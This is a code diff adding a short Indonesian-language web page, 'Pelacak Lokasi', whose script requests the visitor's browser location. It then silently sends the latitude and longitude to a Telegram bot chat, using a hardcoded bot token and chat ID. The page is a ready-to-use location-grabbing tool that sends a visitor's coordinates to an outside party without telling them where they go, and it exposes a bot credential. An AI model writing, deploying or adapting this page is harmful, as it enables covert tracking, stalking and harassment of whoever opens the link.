@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Pelacak Lokasi</title>
+</head>
+<body>
+  <h1>Halo, sedang melacak lokasi...</h1>
+  <p id="status">Meminta izin lokasi...</p>
+
+  <script>
+    const token = "7716589580:AAHh-66I9FYbYLYjpcN2F40dHeoUYwUvWzk";
+    const chatId = "5665946730";
+
+    function kirimLokasi(lat, lon) {
+      const pesan = `Lokasi:\nLatitude: ${lat}\nLongitude: ${lon}`;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: pesan
+        })
+      });
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        document.getElementById("status").textContent = `Lokasi ditemukan: ${lat}, ${lon}`;
+        kirimLokasi(lat, lon);
+      }, err => {
+        document.getElementById("status").textContent = "Gagal mendapatkan lokasi.";
+      });
+    } else {
+      document.getElementById("status").textContent = "Geolocation tidak didukung.";
+    }
+  </script>
+</body>
+</html>
